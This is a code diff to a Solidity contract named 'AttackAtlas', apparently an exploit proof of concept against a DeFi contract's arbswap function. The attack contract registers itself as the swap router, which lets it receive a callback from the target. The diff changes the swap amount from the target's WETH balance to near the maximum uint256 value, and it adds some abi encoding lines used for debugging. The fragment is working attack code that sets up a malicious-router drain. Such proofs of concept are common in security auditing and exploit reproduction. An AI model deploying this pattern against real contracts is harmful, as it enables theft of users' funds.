@@ -15,13 +15,14 @@ contract AttackAtlas {
         routers[0] = address(this);
         uint256[] memory routerType = new uint256[](1);
         uint256[] memory pairBinId = new uint256[](1);
+        pairBinId[0] = 1;
         address[] memory tokensIn = new address[](1);
         tokensIn[0] = weth;
         address[] memory tokensOut = new address[](1);
         tokensOut[0] = weth;
         int128[] memory curvei = new int128[](1);
         int128[] memory curvej = new int128[](1);
-        uint256 amt = atlas.getBalance(weth);
+        uint256 amt = type(uint256).max - 1;
 
         IAtlas.SwapData memory swapdata = IAtlas.SwapData({
             routers: routers,
@@ -34,6 +35,21 @@ contract AttackAtlas {
             amt: amt
         });
         atlas.arbswap(swapdata);
+
+        bytes memory calldata_ = abi.encode(swapdata);
+        abi.decode(calldata_, (IAtlas.SwapData));
+        bytes memory calldata_2 = abi.encode(
+            routers,
+            routerType,
+            pairBinId,
+            tokensIn,
+            tokensOut,
+            curvei,
+            curvej,
+            amt
+        );
+        // console.logBytes(calldata_);
+        // console.logBytes(calldata_2);
     }
 
     function swapExactTokensForTokens(
